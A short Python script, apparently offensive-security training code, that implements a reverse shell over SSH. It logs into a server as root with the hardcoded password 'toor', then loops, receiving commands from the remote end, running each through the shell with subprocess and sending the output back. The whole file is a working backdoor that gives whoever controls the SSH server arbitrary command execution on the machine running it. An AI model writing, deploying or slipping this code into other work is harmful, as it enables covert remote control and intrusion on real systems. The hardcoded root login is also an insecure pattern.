#!/usr/bin/python3

import paramiko
import threading
import subprocess

ip='localhost'
user='root'
passwd='toor'
command='ClientConnected'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(ip, username=user, password=passwd)
ssh_session = client.get_transport().open_session()

if ssh_session.active:
    ssh_session.send(command)
    # read banner
    print(ssh_session.recv(1024))
    while True:
        # Get command
        command = ssh_session.recv(1024)
        try:
            cmd_output = subprocess.check_output(command, shell=True)
            ssh_session.send(cmd_output)
        except Exception as e:
            ssh_session.send(str(e))
    client.close()


